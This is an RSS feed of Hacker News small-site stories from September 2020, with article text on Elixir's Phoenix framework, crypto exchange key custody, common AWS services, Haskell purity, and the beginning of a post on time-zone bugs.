<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 27 Sep 2020 12:30:54 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 27 Sep 2020 12:30:54 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[I write a free weekly newsletter featuring curated AI news, articles and jobs.]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24588181">thread link</a>) | @dominikposmyk
<br/>
September 25, 2020 | https://www.quickchat.ai/newsletter | <a href="https://web.archive.org/web/*/https://www.quickchat.ai/newsletter">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <!-- <div class="col-12 col-sm-7" style="display: flex; padding-top: 40px; padding-bottom: 40px"> -->
      <div>
        <div>
          
          <h2>A free weekly newsletter featuring curated news, articles, essays, job offers, Tweets and open source projects related to artificial intelligence ü§ñ, machine learning ‚öôÔ∏è and data science üë©‚Äçüî¨.</h2>
          <p><a href="https://itemsy.com/quickchat" target="_blank">Let me read it first &gt;</a></p>
          
          <p>
            <span>Curated by</span>
            <a href="https://quickchat.ai/"><img src="https://www.quickchat.ai/img/logo_color.png"></a>
          </p>
        </div>
      </div>
      <!-- <div class="col-12 col-sm-5" style="display: flex">
        <img src="img/newsletter.jpg" style="width: 100%; margin: auto" />
      </div> -->
    </div></div>]]>
            </description>
            <link>https://www.quickchat.ai/newsletter</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588181</guid>
            <pubDate>Fri, 25 Sep 2020 09:40:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things Elixir's Phoenix Framework Does Right]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24588122">thread link</a>) | @dinomad
<br/>
September 25, 2020 | https://scorpil.com/post/things-elixirs-phoenix-framework-does-right/ | <a href="https://web.archive.org/web/*/https://scorpil.com/post/things-elixirs-phoenix-framework-does-right/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper"><div id="container"><div><article itemscope="" itemtype="http://schema.org/BlogPosting"><div itemprop="articleBody"><p>I dabbled in Phoenix for a while now, but never <em>really</em> got my hands dirty with it right up until now. Apart from the whole framework being surprisingly well thought through, there are a few things that strike me as being done <em>exceptionally</em> well in Phoenix, compared to the rest of modern web frameworks.</p><p><img src="https://scorpil.com/img/phoenix.png" alt="Phoenix Framework Logo"></p><h3 id="1-striking-a-balance-between-flexibility-and-strictness">1. Striking a balance between flexibility and strictness</h3><p>Modern web frameworks can be roughly divided into two camps:</p><ul><li>Flexible ‚ÄúDIY‚Äù frameworks are a little more than a set of utilities for the most common web-related tasks. Most Go frameworks are like this, as well as ExpressJS. They enforce little to no rules for the structure of your applications and rely on the community to come up with the extensions and best practices. As a result, they are very flexible; those with a large community have extensions to perform any task imaginable. On the flip side, apps built on such a foundation can, given poor governance, slowly evolve into an unsupportable mess of incompatible plugins and mismatched coding styles.</li><li>Strict ‚Äúbatteries included‚Äù frameworks bring with them a complete set of tools to perform common web development tasks, as well as a set of conventions to go with it. They guide the developer into optimal code structure and typically strive to provide a single favored way of doing things. Of course, these kinds of frameworks are also extendable, but built-in tools often get embedded so deep into the project that they are almost irreplaceable. In this category, the most popular examples are Django and Ruby on Rails.</li></ul><p>Of course, most frameworks are not on an extreme end of the scale, but the distinction is there. Worth noting that neither group is strictly better than the other ‚Äì each has its usecases.</p><p>Phoenix Framework, in my mind, holds very close to the middle of this scale for these reasons:</p><ul><li>it builds upon Elixir‚Äôs functional philosophy, so it has a very clear idea how things <em>should</em> work (single request context passed around as the first argument to all components that participate in a response generation, avoiding side effects where possible, MVC-inspired architecture, etc.)</li><li>it does not hide its internal details in a ‚Äúblack box‚Äù, quite the opposite - it encourages you to understand internal conventions to write your own code in the same fashion. When you get comfortable using a framework, you can probably read its code without too much trouble.</li><li>by default Phoenix comes with a huge pack of tools and utils (ORM, routing, test suit, HTML rendering, metrics dashboard (sic!)‚Ä¶), but in most cases, there‚Äôs a trivial way to swap them out or turn them off.</li></ul><h3 id="2-reactiveness">2. Reactiveness</h3><p>When an app requires bi-directional communication between client and server, you usually either
integrate a 3rd party library into the framework, which means writing a pile of glue code, or
use a specialized framework like Tornado, which (caution, personal opinion here) kind of an awkward choice for those parts of the web app that do not concern themselves with WebSockets.</p><p>Phoenix is great for classical HTTP, but persistent communication is where it <em>really</em> shines. Primitives it gives you with channels, PubSub and Presence are just enough to avoid boilerplate without sacrificing flexibility. Recent live view release is a whole new way of building dynamic apps. I wouldn‚Äôt go as far as to call it revolutionary, but it is definitely an intriguing attempt of bridging the gap between frontend and backend.</p><h3 id="3-performance">3. Performance</h3><p>Phoenix‚Äôs performance has surprisingly little to do with the framework itself. It inherited its impressive concurrence characteristics from Elixir, which got it from Erlang, which got it thanks to the primitives of the BEAM virtual machine and the architectural patterns of OTP. The main principle at work to achieve concurrency is to schedule lightweight threads of execution to run each independent piece of work concurrently. You might have seen this approach in other languages (goroutines, python‚Äôs greenlets, etc.), that‚Äôs because it works great to organize concurrent code execution without performance hit and with a minimal headache for a developer. However, BEAM gives this concept support on a VM level, which means it can be optimized even on a hardware level.</p><p>While lightweight processes help you perform well on your IO-bound tasks, Elixir being a compiled language means that CPU bound tasks won‚Äôt bottleneck easily as well, and perform on less computing resources than most alternatives. While I can‚Äôt be 100% sure that it will be faster for your application than Go or Rust in terms of CPU usage, I‚Äôm reasonably sure that it will be more than fast enough in a context of a typical web app.</p><p><em><strong>Update:</strong> correction based on discussion in here and on other platforms: Elixir is slower than Go/Rust on purely CPU-bound tasks, mainly because BEAM interrupts running threads for task scheduling. Also, Elixir/Erlang compiles to bytecode, not directly to the machine code (although BeamAsm, JIT compiler for Erlang‚Äôs VM, has <a href="https://github.com/erlang/otp/pull/2745">landed in master 4 days ago</a>, so this should change in the next OTP release).</em></p><h3 id="4-failure-tolerance-and-cluster-awareness">4. Failure tolerance and cluster-awareness</h3><p>You might have heard Phoenix being called a ‚Äúmonolithic framework‚Äù. This is true to some extent: Phoenix <em>does</em> encourage you to put your frontend, backend, and background tasks in the same app. However, it also provides facilities to ensure that failure in a single component of the app will not affect other independent components. To explain in short, the app is divided into processes that communicate with each other via kind-of event messages. Each component is supervised, the supervisor will catch unhandled failures and restart the process in an attempt to fix them. It‚Äôs somewhat reminiscent of a microservice architecture, just on a lower level.</p><p>Unlike most frameworks, Phoenix understands that it will most likely run on more than one node. It provides a way to communicate over the network in exactly the same way you communicate between the processes within your app.</p><p>This does not mean that Phoenix is a bad choice for microservices, it just means that framework itself can handle some of the same concerns microservices are designed to handle. A smaller app might benefit from that by avoiding some of the complexities of building up your own microservices architecture. Bigger apps, and those that are already built as microservices, can still incorporate Phoenix effectively.</p><h3 id="are-there-any-drawbacks">Are there any drawbacks?</h3><p>Elixir, and functional programming in general, is still a long way away from the mainstream. If you don‚Äôt know your way around closures, immutable data structures, and functional thinking it will take you a while before getting to feel comfortable with Phoenix. The good news is that functional programming is on an upwards trend, and with applications growing more parallel and distributed, I don‚Äôt think this trend will reverse any time soon. So the knowledge you acquire in the process will serve you well going forward, independent from what the future holds for Phoenix.</p><p>The included tooling is great, but you might miss some 3rd party SDK‚Äôs when you need them. That‚Äôs definitely something to consider when starting a project. To give you an example: <a href="https://aws.amazon.com/getting-started/tools-sdks/">AWS</a> at the time of writing does not provide an official elixir client library.</p><p>Phoenix Framework a rock-solid, production-ready tool with a variety of usecases. It feels fresh and well thought through. I won‚Äôt be surprised if Phoenixes popularity continues to grow to reach the level of ‚ÄûTop tier‚Äú frameworks in the next few years.</p></div></article></div></div></div></div>]]>
            </description>
            <link>https://scorpil.com/post/things-elixirs-phoenix-framework-does-right/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588122</guid>
            <pubDate>Fri, 25 Sep 2020 09:29:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why 2FA isn't enough with Crypto Exchanges]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24588024">thread link</a>) | @timothy-quinn
<br/>
September 25, 2020 | https://blog.congruentlabs.co/why-2fa-isnt-enough-with-exchanges/ | <a href="https://web.archive.org/web/*/https://blog.congruentlabs.co/why-2fa-isnt-enough-with-exchanges/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.congruentlabs.co/content/images/size/w300/2020/09/Keep-Crypto-Decentralized.png 300w,
                            https://blog.congruentlabs.co/content/images/size/w600/2020/09/Keep-Crypto-Decentralized.png 600w,
                            https://blog.congruentlabs.co/content/images/size/w1000/2020/09/Keep-Crypto-Decentralized.png 1000w,
                            https://blog.congruentlabs.co/content/images/size/w2000/2020/09/Keep-Crypto-Decentralized.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.congruentlabs.co/content/images/size/w2000/2020/09/Keep-Crypto-Decentralized.png" alt="Why 2FA isn't enough with Crypto Exchanges">
            </figure>

            <section>
                <div>
                    <p>A lot of trust needs to be put in to cryptocurrency exchanges. Firstly because you're entrusting them with your Fiat currency, and secondly because you're entrusting them with the <em>keys </em>to your cryptocurrency.</p><p>Each cryptocurrency address, regardless if it's Bitcoin, Litecoin, or Ethereum, is a public representation of a pair of <em>cryptographic keys</em>. That pair consists of two parts - a <strong>public </strong>key, and a <strong>private </strong>key. What's important here is that the <strong>private </strong>key is what allows you to make transactions, giving you the ability to transfer coins to other parties.</p><p>Now if you've ever used an exchange before, you'll notice that <strong>you don't normally see these keys</strong>. The exchange is managing it all for you in the background. They might have the keys for a Bitcoin or Ethereum address specifically created for your account in the background, which they're using to then make the trades that you ask them to via their website or app.</p><p>This is great, but those private keys? You're not going to see them. In fact if you transfer coins out of exchanges and <a href="https://live.blockcypher.com/">watch the transaction with a service like BlockCypher</a> - you'll often see the amount you transferred came from some address that was holding a lot more on it as a pool for multiple users, and your particular amount was divvied out to wherever you asked it to go with the remainer staying on the original address or moved somewhere else.</p><p>This kind of environment wasn't quite the intent for cryptocurrency - the intent was to <em>decentralise </em>- i.e. as a user, you control your own keys - not some larger authority like a bank. Most of the popular exchanges are well run and have proven themselves so far regarding trust and security, but ultimately they still hold your keys. They can assure you of their security controls and processes over and over, even enabling 2-Factor Authentication to <em>really</em> lock down access with YubiKeys, OTP tokens, and SMS codes. They can assure you that they provide cold storage services to <em>really</em> lock down access. But even 5 or 500 layers of security, never forget <strong>- they still hold your keys</strong>.</p><h2 id="so-what-should-you-do">So what should you do?</h2><p>The first step is to take ownership back. Most exchanges provide a capability to <em>send</em> your holdings to another address. They usually bury that feature behind a bunch of menus, but you should hopefully find the capability. All you need to do is create addresses in a product under your control, like <a href="https://signata.net/">Signata</a>, and then you can use those addresses as the destination for sending your holdings from the exchange.</p><p>The second step is to enable 2FA on the exchange. Yes, we've just outlined why 2FA isn't enough to protect your holdings - but that doesn't mean you shouldn't be using it anyway. At some point you're going to want to move your holding from Signata back into the exchange to trade them for fiat (or other currencies). If your exchange supports YubiKeys for 2FA, then great! - you can use your same YubiKey for both logging in to the exchange, and protecting your private keys in <a href="https://signata.net/">Signata</a>.</p><p>The most secure way to keep cryptocurrency is to stay decentralised. Be the owner of your crypto assets, and keep the power to send them wherever and whenever you want. Don't let exchanges hold on to your assets - hold them in a wallet that <em>you</em> control. <a href="https://signata.net/">Try Signata today for free</a> - you can add as many addresses and YubiKeys and you like, and we never see your private keys.</p>
                </div>
            </section>

            
            
        </article>
    </div>
</div></div>]]>
            </description>
            <link>https://blog.congruentlabs.co/why-2fa-isnt-enough-with-exchanges/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588024</guid>
            <pubDate>Fri, 25 Sep 2020 09:13:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Most Commonly Used AWS Services and How We Are Using Them]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24587218">thread link</a>) | @sunilkumarc
<br/>
September 24, 2020 | https://sunilkumarc.in/most-commonly-used-aws-services-and-how-we-are-using-them?guid=abbe7ff8-14af-4d94-beb6-6a9da8bb0f64&deviceId=b6a7ad08-1190-46b0-87e6-716c034f4274 | <a href="https://web.archive.org/web/*/https://sunilkumarc.in/most-commonly-used-aws-services-and-how-we-are-using-them?guid=abbe7ff8-14af-4d94-beb6-6a9da8bb0f64&deviceId=b6a7ad08-1190-46b0-87e6-716c034f4274">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>I work as a senior software developer at a startup. We mainly provide APIs to integrate voice and sms services into applications. So naturally our complete infrastructure is on a cloud provider, which in our case is AWS. </p>
<p>For someone who has not worked on managing infrastructure on cloud, it can be very difficult to understand different components involved in building scalable applications. For me personally, I didn't know anything about AWS concepts before I started woking here. In the last 2.5 years I've learnt so much on AWS and knowing the importance of learning these concepts, I decided to write a series of articles for people who want to get started with AWS or any other cloud services provider in general. This is the first article in the series.</p>
<p>AWS is one of the market leaders who provides cloud computing services and powers the applications behind companies like Facebook, Netflix, LinkedIn, NASA etc.</p>
<p>As a software developer it's important to know about different cloud computing services which are needed to build distributed, highly scalable applications. If you've not worked on infrastructure yet, you'll definitely get to work on it in your development career at some point. In this article I'll cover some of the important services we use from AWS.</p>
<p>AWS provides numerous services but below are the commonly used ones:</p>
<ul>
<li><a href="#ec2">Elastic Compute Cloud (EC2)</a></li>
<li><a href="#rds">Relational Database Service (RDS)</a></li>
<li><a href="#ecs">Elastic Container Service (ECS)</a></li>
<li><a href="#elasticache">ElastiCache</a></li>
<li><a href="#s3">Simple Storage Service (S3)</a></li>
<li><a href="#sqs">Simple Queuing Service (SQS)</a></li>
<li><a href="#load-balancer">Load Balancer</a></li>
<li><a href="#route53">Route 53</a></li>
<li><a href="#lambda">AWS Lambda</a></li>
<li><a href="#vpc">Amazon Virtual Private Cloud (VPC)</a></li>
</ul>
<h3 id="lessa-idec2greaterlessagreater-1-elastic-compute-cloud-ec2"><a id="ec2"></a> 1. Elastic Compute Cloud (EC2):</h3>
<p>EC2 instances are basically servers with an operating system which can be used to run your applications on the internet just like you run your applications on your laptop during development.</p>
<p>EC2 machines come with different configurations for CPU, Memory, Ram etc. They are categorised based on their computing power, memory optimisation, storage optimisation etc. For example all the memory optimised instances belong to <strong>m</strong> family. All the compute optimised instances belong to <strong>c</strong> family etc.</p>
<p>You can use these instances to run backend servers, background scripts, database servers, front end applications etc.</p>
<p>Since we have many micro services for powering our APIs, we use these instances along with Elastic Container Service (container orchestration service) to deploy our docker containers. We even use standalone EC2 instances as jumpbox hosts for running any ad-hoc scripts to perform tasks like backfill data, connect to private database, redis cache etc.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/d4jelj93xx9gocwqvtn9.jpeg" alt="ec2_image"></p>
<h3 id="lessa-idrdsgreaterlessagreater-2-relational-database-service-rds"><a id="rds"></a> 2. Relational Database Service (RDS):</h3>
<p>RDS is a distributed relational database service.</p>
<p>Amazon RDS is available on several database instance types - optimised for memory, performance or I/O - and provides six familiar database engines to choose from, including Amazon Aurora, PostgreSQL, MySQL, MariaDB, Oracle Database, and SQL Server.</p>
<p>Amazon RDS allows your to create read replicas in the same region or on a different region. You can create one or more replicas of a given source DB Instance and serve high-volume application read traffic from multiple copies of your data, thereby increasing aggregate read throughput.Read replicas can also be promoted when needed to become standalone DB instances.</p>
<p>We use PostgreSQL for all of our main databases and RedShift to keep the data needed for analytics and reporting. There's one central database where the common data is stored and separate databases where data related to different products owned by respective teams are stored.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/q7kxr8vn4pwxvwte8bc5.png" alt="Screen Shot 2020-09-23 at 10.40.27 PM"></p>
<h3 id="lessa-idecsgreaterlessagreater-3-elastic-container-service-ecs"><a id="ecs"></a> 3. Elastic Container Service (ECS):</h3>
<p>AWS ECS is a fully managed container orchestration service.</p>
<p>ECS has been a foundational pillar for key Amazon services and it can natively integrate with other services such as Amazon Route 53, Secrets Manager, AWS Identity and Access Management (IAM), and Amazon CloudWatch providing you a familiar experience to deploy and scale your containers.</p>
<p>You can add auto scaling to your ECS clusters to scale up or scale down the number of instances and tasks depending on your traffic needs. When your services are getting high traffic you can increase the number of cluster instances and service tasks. Similarly you can decrease them when the traffic is less. For example you can keep a desired count of 4 containers for a particular service. Using auto scaling you can setup rules like if the CPU % goes beyond 80%, add 2 more containers. If CPU % goes below 40%, remove 2 containers.</p>
<p>Within our organisation each team has their own ECS cluster and each cluster has micro service containers owned by them. We scale individual service independently depending on the traffic.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/ina4ojrdmfcizwosqgx8.png" alt="product-page-diagram_ECS_1.86ebd8c223ec8b55aa1903c423fbe4e672f3daf7"></p>
<h3 id="lessa-idelasticachegreaterlessagreater-4-elasticache"><a id="elasticache"></a> 4. ElastiCache:</h3>
<p>Amazon ElastiCache works as a high throughput and low latency in-memory data store and cache to support the most demanding applications requiring sub-millisecond response times.</p>
<p>Amazon ElastiCache is a popular choice for real-time use cases like Caching, Session Stores, Gaming, Geospatial Services, Real-Time Analytics, and Queuing.</p>
<p>Amazon ElastiCache offers fully managed Redis and Memcached for your most demanding applications that require sub-millisecond response times.</p>
<p>Similar to EC2 instance types, there are multiple instance families and types available like t3, r5, m5 etc. You can use the one which you need based on your computing requirements and budget constraints.</p>
<p>In our organisation, we have a service which gets around 6000 reqs/sec and we needed low API response time from this service. So we decided use ElastiCache as the primary source of data for this micro service. The service has been able to serve requests with single digit millisecond response time without any issues.</p>
<p>Apart from this we use Redis in many other critical services as write-through, write-back cache and also to store some data which can be accessed quickly.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/n0s5ovl9mgidg9a96xd8.png" alt="elasticache"></p>
<h3 id="lessa-ids3greaterlessagreater-5-simple-storage-service-s3"><a id="s3"></a> 5. Simple Storage Service (S3):</h3>
<p>As the name suggests S3 provides low cost object storage service with high scalability, data availability, security and performance.</p>
<p>S3 can be used to store files for many use cases like websites, mobile apps, enterprise applications, backup and restore etc.</p>
<p>Amazon S3 is designed for 99.999999999% (11 9's) of durability, and stores data for millions of applications for companies all around the world.</p>
<p>We use S3 in various use cases like to store call recordings, invoice pdf files, payment receipts, backup older service logs, Amazon Athena to query data stored in S3 for analytics etc. We even use it for lambda trigger events.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/mdzls6579so4u2b9p4jm.jpg" alt="Diagram_S3_Access_Points.fa88c474dc1073aede962aaf3a6af2d6b02be933"></p>
<h3 id="lessa-idsqsgreaterlessagreater-6-simple-queuing-service-sqs"><a id="sqs"></a> 6. Simple Queuing Service (SQS):</h3>
<p>SQS is a fully managed message queuing service that enables you to decouple and scale micro services independently. Using SQS you can send, store and receive messages between different components at any volume. This helps you to build highly scalable and distributed applications.</p>
<p>SQS offers two types of message queues:</p>
<ul>
<li><p>Standard queues: Standard SQS should be used when you've requirements for maximum throughput, no ordering and at-least-once delivery of messages is needed.</p>
</li>
<li><p>FIFO queues: FIFO SQS should be used when order of the messages is important and they should be processed exactly once, in the same order they are sent.</p>
</li>
</ul>
<p>The two important properties of SQS queues are message retention period and default visibility timeout. </p>
<p><strong>Message Retention Period:</strong> is the time for which any message pushed into the queue is retained. For example if this value is 3 days, messages will be deleted after 3 days from the queue.</p>
<p><strong>Default Visibility Timeout:</strong> once any worker / application has picks up a message, the default visibility timeout is the time only after which the message will be visible again for other workers to pick it up and process.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/o1herbvj4yhv8u7pfjy9.png" alt="Diagram2"></p>
<h3 id="lessa-idload-balancergreaterlessagreater-7-load-balancer"><a id="load-balancer"></a> 7. Load Balancer:</h3>
<p>Load Balancer is a critical component of any distributed system which sits between a client and a server, accepts incoming requests, and routes them across a a cluster of servers to handle the load.</p>
<p>It keeps track of health status of all the servers connected. If a particular server is unhealthy, then it will not send incoming requests to that server.</p>
<p>Benefits of a load balancer:</p>
<ul>
<li>Faster user experience</li>
<li>Less downtime and high throughput. If a particular server is down, LB takes care of routing the traffic to the ones which are up.</li>
<li>Reduces individual server load and prevents any one application server from becoming a single point of failure.</li>
<li>Improves response time </li>
<li>Improves overall system availability</li>
</ul>
<p>Routing algorithms used:</p>
<ul>
<li>Least Connection Method</li>
<li>Least Response Time Method</li>
<li>Least Bandwidth Method</li>
<li>Round Robin Method</li>
<li>Weighted Round Robin Method</li>
<li>IP Hash Method</li>
</ul>
<p>We use both internet facing and internal load balancers in our services depending on whether it's a customer facing application or an internal micro service.</p>
<p>There are many other concepts that are tightly coupled with Load Balancers like:</p>
<ul>
<li>Target Groups</li>
<li>Listener Rules</li>
</ul>
<p>These are not in the scope of this article. But I highly recommend reading about these.</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/lpypr06mji7dnjg07gqz.png" alt="alb"></p>
<h3 id="lessa-idroute53greaterlessagreater-8-route-53"><a id="route53"></a> 8. Route 53:</h3>
<p>Route53 a highly available and scalable DNS service from AWS. If you don't know what a DNS service is, it's basically the service which routes end users to Internet applications by translating names like <a href="http://www.example.com/" target="_blank">example.com</a> into the numeric IP addresses like 192.0.2.1 that computers use to connect to each other.</p>
<p>Route53 allows us to route traffic through a variety of routing types like Simple Routing, Weighted Round Robin, Latency Routing, Failover Routing, Multi Answer Routing, Geolocation etc. With different combinations of these we can build highly available fault tolerant systems.</p>
<p>There are different types of DNS records available depending on how you want to route based on DNS queries:</p>
<ul>
<li>A record type</li>
<li>AAAA record type</li>
<li>CAA record type</li>
<li>CNAME record type</li>
<li>MX record type</li>
<li>NAPTR record type</li>
<li>NS record type</li>
<li>PTR record type</li>
<li>SOA record type</li>
<li>SPF record type</li>
<li>SRV record type</li>
<li>TXT record type</li>
</ul>
<p>We use route53 in various use cases within our organisation to:</p>
<ul>
<li>Route traffic from a host endpoint to an internal load balancer using CNAME record</li>
<li>Route traffic from a host endpoint to a ‚Ä¶</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sunilkumarc.in/most-commonly-used-aws-services-and-how-we-are-using-them?guid=abbe7ff8-14af-4d94-beb6-6a9da8bb0f64&amp;deviceId=b6a7ad08-1190-46b0-87e6-716c034f4274">https://sunilkumarc.in/most-commonly-used-aws-services-and-how-we-are-using-them?guid=abbe7ff8-14af-4d94-beb6-6a9da8bb0f64&amp;deviceId=b6a7ad08-1190-46b0-87e6-716c034f4274</a></em></p>]]>
            </description>
            <link>https://sunilkumarc.in/most-commonly-used-aws-services-and-how-we-are-using-them?guid=abbe7ff8-14af-4d94-beb6-6a9da8bb0f64&amp;deviceId=b6a7ad08-1190-46b0-87e6-716c034f4274</link>
            <guid isPermaLink="false">hacker-news-small-sites-24587218</guid>
            <pubDate>Fri, 25 Sep 2020 06:52:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell Vedanta]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24587159">thread link</a>) | @johndoe42377
<br/>
September 24, 2020 | https://karma-engineering.com/lab/wiki/Haskell/Vedanta | <a href="https://web.archive.org/web/*/https://karma-engineering.com/lab/wiki/Haskell/Vedanta">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikipage">
<p>
A program is precise specification of a process, detailed-enough to be executed by an abstract machine.
</p>
<p>
An algorithm is a formalized (well-defined and precise) general procedure (a sequence of actions to perform), to be implemented in all sufficient and necessary details.
</p>
<h2 id="Haskell">Haskell</h2>
<p>
Haskell is pure Logic. Strongly-typed with type-classes and highly syntactically sugared, which is compiled to a intermediate language (MIR) which is also a language based on a <em>Simply-Typed Lambda Calculus</em>, which, in turn, is <em>evaluated by runtime as a type-checked state machine</em> - this is what the function <code>main</code> produces (which is what a Haskell executable really is).
</p>
<p>
Not just that, all Haskell code, including MIR, could be evaluated by pure substitution -- by applying rewrite rules, (beta-reduction, inlining, etc.) exactly like Logic and Math, which, look at this:
</p>
<p>
<em>makes Haskell a pure high-order predicate logic, statically typed with type-classes, reducible to pure Lambda Calculus (as its implementation)</em>.
</p>
<p>
C++ is a joke compared to this and NodeJS is just bullshit.
</p>
<h2 id="Purity">Purity</h2>
<p>
All Haskell expressions are pure, even when they describe impure actions to be performed eventually by mundane impure runtime.
</p>
<p>
The expression produced by the main function is a pure definition of a state-machine (an actual structure!) verified to be type-safe (have no contradictions) by the compiler.
</p>
<p>
Each function is pure because the <em>context</em> (or state) is always passed to it as a parameter, even <em>The Whole World</em> is passed in the case of IO (implementation, however, throws it away!).
</p>
<p>
From the mathematical point of view if you have the whole world as a parameter to a function which returns a value <em>together with a new version of the world, after causing some effect on it</em>, then, the function is indeed pure. <em>Same input - same output. Always</em>.
</p>
<p>
This is not a joke. Not just a beautiful metaphor. As long as all functions are pure <em>the substitution model of evaluation (as in Lambda Calculus, Logic and Mathematics) still holds</em>, so Haskell is still a pure higher-order logic - <em>Simply Typed Lambda Calculus extended with some additional evaluation rules, type-classes and decorated with some syntactic sugar</em>. Its MIT is exactly this.
</p>
<p>
One more time: Haskell code is <em>a Pure Logic</em>, not just theoretically but technically and operationally.
</p>
<p>
It all can, in principle, be evaluated with pen and pencil using substitution. Just like Maths.
</p>
<h2 id="Monads">Monads</h2>
<p>
Haskell literally separates a pure functional code from impure by  creating <em>an abstraction barrier</em> between pure and impure code by encapsulation such code into various <a href="https://karma-engineering.com/lab/wiki/Haskell/Monads">Monads</a>.
</p>
<p>
Separation (an abstraction barrier) is enforced at a type level.
Functions below cannot access values (and functions) above.
</p>
<p>
The <em>contexts</em> could play very different roles, from holding algebraic data types, such as <code>Either</code> or <code>Maybe</code>, to encapsulations <code>State</code> and <code>IO</code>.
</p>
<p>
Being composed (which is what it is all about) Monads provide an implicit sequencing for a pure, lazy code, via <a href="https://karma-engineering.com/lab/wiki/FirstPrinciples/Nesting">nesting</a> of functions -- <code>(.)</code> and <code>(&gt;&gt;=)</code> are merely nested lambdas.
</p>
<p>
Thus, Monads are fit to encapsulate <code>IO</code> actions which imply serialization (sequencing).
</p>
<p>
End of the long and messy story.
</p>
<h2 id="Endofknowledge.">End of knowledge.</h2>
<p>
Technically, Haskell is a pure-functional language with lazy semantics  which is statically (and, obviously, strongly) typed with type-classes. It is simplified into an intermediate language (representation), which is just <em>Simple-Typed Lambda Calculus extended with a few additional types, syntactic forms and evaluation rules</em>. Even more technically, it uses <em>System F Omega formalism</em> to implement High-order Logic.
</p>
</div></div>]]>
            </description>
            <link>https://karma-engineering.com/lab/wiki/Haskell/Vedanta</link>
            <guid isPermaLink="false">hacker-news-small-sites-24587159</guid>
            <pubDate>Fri, 25 Sep 2020 06:41:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Time Zone Bugs I Ran Into]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 19 (<a href="https://news.ycombinator.com/item?id=24586991">thread link</a>) | @Sandeepg33k
<br/>
September 24, 2020 | https://blog.davidojeda.dev/4-time-zone-bugs-i-ran-into | <a href="https://web.archive.org/web/*/https://blog.davidojeda.dev/4-time-zone-bugs-i-ran-into">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1600871234687/et6yX6Wlb.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>Software development is hard. Time zones are hard. Dealing with time zones in software development?  Yeah, <strong>harder</strong>.</p>
<p>Here are <strong>4</strong> places where time zones might differ; and 4 personal bug stories for each case. I'll be referring to the same app for each story, the one I work with and maintain in my day-to-day job. This app works with Mexico's City time zone.</p>

<h2 id="time-zone-of-your-app">Time zone of your app</h2>
<p>Your app runs with a default time zone. It's usually the time zone of the server it runs on, but it can be different.</p>
<p>In Java, you can define the time zone of the whole application when it boots. If for some reason you don't want to work with your server's timezone, this is the place to change it.</p>
<h3 id="the-bug-time-in-chile-off-by-one-hour">The bug - Time in Chile off by one hour</h3>
<p>The app shows the date of creation of an object in many places. Three of these places were showing different times; <strong>two incorrect and one correct</strong>.</p>
<p>One error was because I forgot to pass the user's timezone to the date formatter. Quick fix.</p>
<p>The second error was weird. I couldn't identify why, so I compared it with the correct one.</p>
<p>But the third case was only right because the date had been double parsed! Once on the server and a second time on the client (browser).</p>
<p>So none of the three dates were actually correct. <strong>WTF?</strong></p>
<p>After some headaches, I learned that each version of Java comes with a time zone data file. This file includes the latest information on the world's time zones, and the <a target="_blank" href="https://www.iana.org/time-zones">Internet Assigned Numbers Authority (IANA)</a> manages it. </p>
<p>Time zone changes happen when governments decide to apply or not to apply daylight saving times (DST). </p>
